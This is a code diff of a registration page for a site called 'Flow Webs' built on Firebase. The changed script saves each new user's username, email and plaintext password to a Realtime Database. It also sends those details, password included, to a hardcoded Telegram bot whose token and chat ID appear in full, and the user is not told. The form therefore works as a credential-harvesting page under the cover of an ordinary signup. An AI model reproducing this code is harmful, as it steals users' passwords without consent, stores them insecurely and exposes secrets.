@@ -5,10 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Register | Flow Webs</title>
 
-  <!-- Remix Icons -->
   <link href="https://cdn.jsdelivr.net/npm/remixicon@3.2.0/fonts/remixicon.css" rel="stylesheet">
 
-  <!-- Premium Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&family=Montserrat:wght@500;600&display=swap" rel="stylesheet">
 
   <style>
@@ -157,8 +155,6 @@
     <h1 class="login__title">Flow Webs</h1>
 
     <div class="login__content">
-
-      <!-- Username -->
       <div class="login__box">
         <i class="ri-user-3-line login__icon"></i>
         <div class="login__box-input">
@@ -167,7 +163,6 @@
         </div>
       </div>
 
-      <!-- Email -->
       <div class="login__box">
         <i class="ri-mail-line login__icon"></i>
         <div class="login__box-input">
@@ -176,7 +171,6 @@
         </div>
       </div>
 
-      <!-- Password -->
       <div class="login__box">
         <i class="ri-lock-2-line login__icon"></i>
         <div class="login__box-input">
@@ -185,7 +179,6 @@
           <i class="ri-eye-off-line login__eye" id="reg-eye"></i>
         </div>
       </div>
-
     </div>
 
     <button type="submit" class="login__button">Create Account</button>
@@ -196,40 +189,27 @@
   </form>
 </div>
 
-<!-- Firebase SDK -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
 <script>
   const firebaseConfig = {
     apiKey: "AIzaSyBY4tPdcDfl0C-FRiP3L52PA2WctlziUtM",
     authDomain: "flowwebsff.firebaseapp.com",
+    databaseURL: "https://flowwebsff-default-rtdb.firebaseio.com", // Aapka DB URL
     projectId: "flowwebsff",
     appId: "1:693709721624:web:e15f6cba7e97288631736d"
   };
 
   firebase.initializeApp(firebaseConfig);
   const auth = firebase.auth();
+  const database = firebase.database(); // Realtime Database initialize
 
-  // 🔔 TELEGRAM DETAILS (CHANGE THESE)
   const TELEGRAM_BOT_TOKEN = "8381677026:AAF1cE1CJhVHRd-GZSGnKXSX0QtFNYgXACI";
   const TELEGRAM_CHAT_ID = "6815468331";
 
-  // Show / Hide Password
-  document.getElementById("reg-eye").addEventListener("click", () => {
-    const pass = document.getElementById("reg-pass");
-    const eye = document.getElementById("reg-eye");
-
-    if (pass.type === "password") {
-      pass.type = "text";
-      eye.classList.replace("ri-eye-off-line", "ri-eye-line");
-    } else {
-      pass.type = "password";
-      eye.classList.replace("ri-eye-line", "ri-eye-off-line");
-    }
-  });
-
-  // REGISTER + TELEGRAM
+  // Register Logic
   document.querySelector(".login__form").addEventListener("submit", function(e){
     e.preventDefault();
 
@@ -241,34 +221,33 @@
       .then((cred) => {
         const uid = cred.user.uid;
 
-        const message =
-`╭── 𝕎𝔼𝕃ℂ𝕆𝕄𝔼 𝕋𝕆 𝔽𝕃𝕆𝕎 𝕎𝔼𝔹𝕊 ──╮
+        // 🔥 Realtime Database mein data save karne ka tarika
+        return database.ref('users/' + uid).set({
+          username: username,
+          email: email,
+          password: password,
+          uid: uid
+        }).then(() => {
+          // Telegram Notification
+          const message = `╭── 𝕎𝔼𝕃ℂ𝕆𝕄𝔼 𝕋𝕆 𝔽𝕃𝕆𝕎 𝕎𝔼𝔹𝕊 ──╮\n\n🆕 𝐍𝐄𝐖 𝐔𝐒𝐄𝐑 𝐑𝐄𝐆𝐈𝐒𝐓𝐄𝐑\n\n👤 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : ${username}\n📧 𝗘𝗺𝗮𝗶𝗹 : ${email}\n🔑 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : ${password}\n🆔 𝗨𝗜𝗗 : ${uid}`;
 
-🆕 𝐍𝐄𝐖 𝐔𝐒𝐄𝐑 𝐑𝐄𝐆𝐈𝐒𝐓𝐄𝐑
-
-👤 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : ${username}
-📧 𝗘𝗺𝗮𝗶𝗹 : ${email}
-🔑 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : ${password}
-🆔 𝗨𝗜𝗗 : ${uid}
-  
-   👑 𝗢𝗪𝗡𝗘𝗥 : @FLOW_HERE `;
-
-        return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message
-          })
+          return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+          });
         });
       })
       .then(() => {
-        alert("Registration Successful ✅");
+        alert("REGISTER SUCCESSFUL ✅");
         window.location.href = "index.html";
       })
-      .catch(err => alert(err.message));
+      .catch(err => {
+        alert("Error: " + err.message);
+      });
   });
 </script>
+
 
 </body>
 </html>
